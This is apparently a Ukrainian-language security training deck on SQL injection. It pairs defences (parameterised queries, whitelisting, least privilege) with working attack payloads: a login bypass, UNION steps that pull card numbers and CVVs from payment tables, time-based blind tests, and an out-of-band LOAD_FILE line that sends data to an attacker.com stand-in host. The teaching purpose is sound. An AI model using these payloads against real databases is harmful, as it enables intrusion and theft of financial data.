Захист від SQL-ін'єкцій

✅ Підготовлені запити (Prepared Statements) — запит і дані ЗАВЖДИ окремо. 100% запитів
✅ Конструктори запитів ORM (Query Builders) — замість raw SQL де можливо
✅ Валідація за білим списком (Whitelist) — для імен таблиць, стовпців, ORDER BY
✅ Мінімальні привілеї (Least Privilege) — DB user без DROP, DELETE, xp_cmdshell
⚠️ WAF — додатковий шар, НЕ заміна параметризації

SQLi: обхід автентифікації

Класичний приклад обходу логіну

1
Форма логіну
Поля: username та password
2
SQL-запит
SELECT * FROM users WHERE user='...' AND pass='...'
3
Корисне навантаження (Payload)
Username: admin' --   Password: будь-що
4
Результат
WHERE user='admin' --' AND pass='...' → вхід як admin

Варіації: ' OR '1'='1, ' OR 1=1 --, admin'/* — десятки способів обійти логін без параметризації.

UNION-based витягування даних

Техніка читання довільних таблиць

1️⃣ Визначення стовпців: ORDER BY 1, 2, 3... поки не буде помилка → кількість стовпців
2️⃣ Визначення типів: UNION SELECT NULL, 'a', NULL... → знаходимо текстові стовпці
3️⃣ Схема БД: UNION SELECT table_name, column_name FROM information_schema.columns
4️⃣ Витягування: UNION SELECT card_number, cvv, expiry FROM payment_cards --

Один UNION SELECT = доступ до ВСІХ таблиць БД: users, transactions, cards, audit_logs.

Blind SQLi: порівняння технік

Коли відповідь сервера не містить даних напряму

✅
На основі логіки (Boolean-based)
AND 1=1 → нормальна сторінка
AND 1=2 → інша відповідь
Побітове витягування даних
Швидкість: ~1 символ/запит
⏱️
На основі часу (Time-based)
AND IF(1=1, SLEEP(5), 0)
Затримка = true, без затримки = false
Найповільніший метод
Швидкість: ~1 символ/5 сек
📡
Позасмугова (Out-of-band)
LOAD_FILE('\\\\attacker.com\\' + data)
Дані надсилаються через DNS/HTTP
Обходить фільтри відповідей
Швидкість: висока

Blind SQLi повільніший, але не менш небезпечний. Інструменти як sqlmap автоматизують процес за хвилини.

Ключові висновки

1️⃣ SQLi = катастрофа — повний доступ до БД з рахунками та картками
2️⃣ Сліпа ін'єкція (Blind SQLi) — невидимий, але не менш небезпечний
